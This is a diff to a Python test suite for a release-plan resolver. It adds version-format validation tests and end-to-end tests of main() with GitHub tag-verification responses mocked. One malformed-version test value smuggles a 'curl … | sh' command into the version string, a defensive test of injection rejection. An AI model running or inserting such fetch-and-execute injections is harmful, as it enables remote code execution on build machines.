@@ -2,14 +2,19 @@
 
 from __future__ import annotations
 
+import contextlib
+import io
+import json
 import os
 import subprocess
+import sys
 import tempfile
 import unittest
 from pathlib import Path
 from typing import Any
 from unittest import mock
 
+from scripts.release import resolve_plan
 from scripts.release.resolve_plan import (
     ReleasePlan,
     resolve,
@@ -36,6 +41,27 @@ class ResolvePlanTests(unittest.TestCase):
     def test_commit_must_be_hexadecimal(self) -> None:
         with self.assertRaisesRegex(ValueError, "hexadecimal"):
             resolve("0.1.0", "rehearsal", "", "not-a-commit")
+
+    def test_version_must_be_a_plain_release(self) -> None:
+        # The version reaches release.yml's `run:` lines through `${{ }}`, so only the
+        # `X.Y.Z` shape passes, in either mode, whatever the manifest says.
+        malformed = [
+            "",
+            "0.2",
+            "v0.2.1",
+            "0.2.01",
+            "0.2.1-rc.1",
+            "0.2.1+build",
+            "0.2.1\n",
+            '0.2.1"; curl example.invalid | sh; echo "',
+        ]
+        for version in malformed:
+            for mode, ref in (("rehearsal", ""), ("release", f"refs/tags/v{version}")):
+                with (
+                    self.subTest(version=version, mode=mode),
+                    self.assertRaisesRegex(ValueError, "version must be X.Y.Z"),
+                ):
+                    resolve(version, mode, ref, "a" * 40)
 
 
 COMMIT = "c" * 40
@@ -140,8 +166,8 @@ def git(root: Path, *args: str) -> str:
     ).stdout.strip()
 
 
-class CheckoutTests(unittest.TestCase):
-    """The local half: a clean checkout of the commit an annotated release tag names."""
+class ThrowawayRepository(unittest.TestCase):
+    """A repository of two commits, the second carrying the 0.2.1 fdu manifest."""
 
     def setUp(self) -> None:
         # A suite run from a git hook inherits GIT_DIR, which would point every query at
@@ -159,8 +185,17 @@ class CheckoutTests(unittest.TestCase):
         git(self.root, "commit", "--quiet", "-m", "first")
         self.first = git(self.root, "rev-parse", "HEAD")
         (self.root / "README").write_text("fdu 0.2.1\n", encoding="utf-8")
-        git(self.root, "commit", "--quiet", "-am", "second")
+        # main() reads the version from the fdu manifest.
+        manifest = self.root / "crates" / "fdu" / "Cargo.toml"
+        manifest.parent.mkdir(parents=True)
+        manifest.write_text('[package]\nname = "fdu"\nversion = "0.2.1"\n', encoding="utf-8")
+        git(self.root, "add", "README", "crates/fdu/Cargo.toml")
+        git(self.root, "commit", "--quiet", "-m", "second")
         self.head = git(self.root, "rev-parse", "HEAD")
+
+
+class CheckoutTests(ThrowawayRepository):
+    """The local half: a clean checkout of the commit an annotated release tag names."""
 
     def plan(self, mode: str = "release") -> ReleasePlan:
         return resolve("0.2.1", mode, "refs/tags/v0.2.1", self.head)
@@ -193,6 +228,90 @@ class CheckoutTests(unittest.TestCase):
         (self.root / "README").write_text("edited\n", encoding="utf-8")
         with self.assertRaisesRegex(ValueError, "must be clean"):
             validate_checkout(self.root, self.plan())
+
+
+class MainTests(ThrowawayRepository):
+    """
+    The command release.yml runs, which is the only caller of the GitHub half.
+
+    A refactor of main() that dropped the GitHub checks, or ran them under a rehearsal
+    plan, would pass every test of the two halves, so these run it end to end on the
+    throwaway repository with GitHub's answers substituted.
+    """
+
+    def setUp(self) -> None:
+        super().setUp()
+        git(self.root, "tag", "-a", "v0.2.1", "-m", "fdu 0.2.1")
+        self.tag_object = git(self.root, "rev-parse", "refs/tags/v0.2.1")
+        self.urls = [
+            f"{BASE}/git/ref/tags/v0.2.1",
+            f"{BASE}/git/tags/{self.tag_object}",
+            f"{BASE}/compare/{self.head}...main?per_page=1",
+        ]
+        outputs = tempfile.TemporaryDirectory()
+        self.addCleanup(outputs.cleanup)
+        self.github_output = Path(outputs.name) / "github-output"
+
+    def answers(self, verified: bool = True) -> dict[str, Any]:
+        ref_url, tag_url, compare_url = self.urls
+        return {
+            ref_url: {"ref": "refs/tags/v0.2.1", "object": {"type": "tag", "sha": self.tag_object}},
+            tag_url: {
+                "tag": "v0.2.1",
+                "object": {"type": "commit", "sha": self.head},
+                "verification": {"verified": verified, "reason": "valid"},
+            },
+            compare_url: {"status": "identical", "merge_base_commit": {"sha": self.head}},
+        }
+
+    def run_main(self, mode: str, ref: str, answers: dict[str, Any]) -> mock.MagicMock:
+        """Run the plan step's command line, returning the stand-in for `github_get`."""
+        argv = [
+            "resolve_plan.py",
+            *("--root", str(self.root), "--mode", mode, "--ref", ref, "--commit", self.head),
+            *("--repository", "jlevy/fdu", "--validate-checkout"),
+            *("--github-output", str(self.github_output)),
+        ]
+        stdout = io.StringIO()
+        with (
+            mock.patch.object(sys, "argv", argv),
+            mock.patch.dict(os.environ, {"GITHUB_TOKEN": "read-only-token"}),
+            mock.patch.object(
+                resolve_plan, "github_get", side_effect=lambda url, token: answers.get(url)
+            ) as github_get,
+            contextlib.redirect_stdout(stdout),
+            contextlib.redirect_stderr(io.StringIO()),
+        ):
+            try:
+                resolve_plan.main()
+            finally:
+                self.stdout = stdout.getvalue()
+        return github_get
+
+    def outputs(self) -> dict[str, str]:
+        lines = self.github_output.read_text(encoding="utf-8").splitlines()
+        return dict(line.split("=", 1) for line in lines)
+
+    def test_a_release_reads_each_github_proof_with_the_token(self) -> None:
+        github_get = self.run_main("release", "refs/tags/v0.2.1", self.answers())
+        self.assertEqual(
+            github_get.call_args_list, [mock.call(url, "read-only-token") for url in self.urls]
+        )
+        self.assertTrue(json.loads(self.stdout)["publish"])
+        self.assertEqual(self.outputs()["publish"], "true")
+
+    def test_a_github_refusal_stops_the_release(self) -> None:
+        with self.assertRaisesRegex(ValueError, "signature verified"):
+            self.run_main("release", "refs/tags/v0.2.1", self.answers(verified=False))
+        self.assertEqual(self.stdout, "")
+        self.assertFalse(self.github_output.exists())
+
+    def test_a_rehearsal_reads_nothing_from_github(self) -> None:
+        # The same checkout, annotated tag and all: only the mode differs.
+        github_get = self.run_main("rehearsal", "refs/heads/release/v0.2.1", self.answers())
+        github_get.assert_not_called()
+        self.assertFalse(json.loads(self.stdout)["publish"])
+        self.assertEqual(self.outputs()["publish"], "false")
 
 
 if __name__ == "__main__":
